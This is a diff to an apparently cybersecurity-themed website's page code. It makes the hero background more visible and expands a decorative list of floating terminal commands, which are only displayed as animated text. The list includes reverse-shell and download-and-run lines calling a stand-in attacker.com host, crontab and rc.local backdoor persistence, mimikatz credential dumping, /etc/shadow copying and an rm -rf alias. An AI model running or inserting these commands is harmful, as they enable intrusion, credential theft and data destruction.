@@ -174,7 +174,7 @@
             height: 100%;
             pointer-events: none;
             overflow: hidden;
-            opacity: 0.1;
+            opacity: 0.8;
         }
 
         .command-line {
@@ -382,12 +382,12 @@
         }
 
         .hero-background {
-            display:none;
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            opacity:0.8;
             background: 
                 radial-gradient(circle at 20% 50%, rgba(220, 38, 38, 0.1) 0%, transparent 50%),
                 radial-gradient(circle at 80% 20%, rgba(220, 38, 38, 0.08) 0%, transparent 50%),
@@ -2472,29 +2472,94 @@
 
         // Floating terminal commands animation
         function createFloatingCommands() {
-            const container = document.getElementById('terminal-commands');
-            const commands = [
-                'nmap -sS -A -T4 target.com',
-                'msfconsole -q -x "use exploit/multi/handler"',
-                'burpsuite --project-file=pentest.burp',
-                'python3 exploit.py --target 192.168.1.100',
-                'sqlmap -u "http://target.com" --batch --dbs',
-                'hydra -l admin -P rockyou.txt ssh://target',
-                'john --wordlist=rockyou.txt --format=NT hashes.txt',
-                'gobuster dir -u http://target.com -w /usr/share/dirb/wordlists/common.txt',
-                'nikto -h target.com -port 80,443',
-                'wireshark -i eth0 -k -f "tcp port 80"',
-                'hashcat -m 1000 -a 0 hashes.txt rockyou.txt',
-                'nc -lvnp 4444',
-                'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
-                'ssh -L 8080:localhost:80 user@target',
-                'curl -X POST -H "Content-Type: application/json" -d "{\"test\":\"payload\"}" http://target.com/api',
-                'enum4linux -a target.com',
-                'smbclient -L //target.com -N',
-                'rpcclient -U "" -N target.com'
-            ];
-            
-            function createCommand() {
+    const container = document.getElementById('terminal-commands');
+const commands = [
+    // Reconnaissance
+    'nmap -sC -sV -p- target.com',
+    'whois target.com',
+    'dig +short target.com',
+    'traceroute target.com',
+    'nslookup target.com',
+    'theharvester -d target.com -l 100 -b all',
+    'sublist3r -d target.com',
+    'dnsenum target.com',
+    'fierce --domain target.com',
+    'amass enum -d target.com',
+
+    // Exploitation
+    'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"',
+    'exploit-db search buffer overflow windows',
+    'python3 shellshock.py --target target.com',
+    'searchsploit vsftpd 2.3.4',
+    'python3 exploit.py 192.168.0.105 80',
+    'nc -e /bin/bash attacker.com 4444',
+    'curl -s http://attacker.com/shell.sh | bash',
+
+    // Post-exploitation
+    'mimikatz "privilege::debug" "sekurlsa::logonpasswords"',
+    'meterpreter > getuid',
+    'scp root@target:/etc/shadow ./shadow_backup',
+    'sshpass -p "toor" ssh root@target',
+    'powershell -enc <base64 payload>',
+    'crackmapexec smb target -u admin -p password',
+
+    // Privilege Escalation
+    'sudo -l',
+    'find / -perm -u=s -type f 2>/dev/null',
+    'getcap -r / 2>/dev/null',
+    'linpeas.sh | tee linpeas-output.txt',
+    'pspy64',
+    'python -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
+
+    // Persistence
+    'echo "@reboot root /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" >> /etc/crontab',
+    'ssh-keygen -t rsa && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys',
+    'echo "alias ls=\'rm -rf *\'" >> ~/.bashrc',
+    'cp backdoor /usr/local/bin/cronjobd && echo "/usr/local/bin/cronjobd" >> /etc/rc.local',
+
+    // Web Application Tools
+    'sqlmap -u "http://target.com/login.php?id=1" --dump',
+    'nikto -host https://target.com',
+    'gobuster dir -u http://target.com -w big.txt',
+    'wfuzz -c -z file,users.txt -z file,pass.txt --hc 401 http://target.com/login.php',
+    'wpscan --url http://wordpress.target --enumerate u',
+
+    // Cracking / Crypto
+    'hashcat -m 1800 -a 0 hashes.txt rockyou.txt',
+    'john --format=md5crypt --wordlist=rockyou.txt hash.txt',
+    'gpg --import stolen_private_key.gpg',
+    'openssl enc -aes-256-cbc -d -in secrets.enc -out secrets.txt',
+    'python3 bruteforce.py --zipfile secret.zip --wordlist rockyou.txt',
+
+    // Networking & Monitoring
+    'tcpdump -i wlan0 port 80',
+    'wireshark -k -i eth0',
+    'ettercap -T -q -i eth0 -M arp:remote /target/ /gateway/',
+    'netstat -tulnp',
+    'iptables -A INPUT -p tcp --dport 22 -j DROP',
+    'ip a; ip r; iptables -L',
+
+    // Linux Enumeration
+    'uname -a',
+    'lsblk',
+    'cat /etc/passwd',
+    'history | tail -n 100',
+    'env',
+    'ls -la /home/*/.ssh',
+
+    // Miscellaneous / Lateral Movement
+    'smbclient -L //target/share -N',
+    'rpcclient -U "" -N target',
+    'crackmapexec smb 192.168.1.0/24 -u admin -p admin',
+    'rdesktop -u user -p password target.com',
+    'xfreerdp /u:user /p:pass /v:192.168.1.10',
+
+    // Persistence Through Tools
+    'systemctl enable reverse-shell.service',
+    'echo "malicious_script.sh" > /etc/init.d/malicious && chmod +x /etc/init.d/malicious'
+];
+
+    function createCommand() {
                 const command = document.createElement('div');
                 command.className = 'command-line';
                 command.textContent = '$ ' + commands[Math.floor(Math.random() * commands.length)];
@@ -2502,17 +2567,22 @@
                 command.style.animationDuration = (Math.random() * 15 + 10) + 's';
                 command.style.fontSize = (Math.random() * 4 + 10) + 'px';
                 container.appendChild(command);
-                
-                setTimeout(() => {
-                    if (command.parentNode) {
-                        command.parentNode.removeChild(command);
-                    }
-                }, 25000);
+
+        setTimeout(() => {
+            if (command.parentNode) {
+                command.parentNode.removeChild(command);
             }
-            
-            // Create initial commands
-            setInterval(createCommand, 2500);
+        }, 30000);
+    }
+
+    // Create a denser stream of commands by decreasing interval and launching multiple per tick
+    setInterval(() => {
+        for (let i = 0; i < 2; i++) {  // Increase multiplier to raise density
+            createCommand();
         }
+    }, 1000);
+}
+
 
         // Auto-sliding Carousel Functions
         function startCarouselAutoplay() {
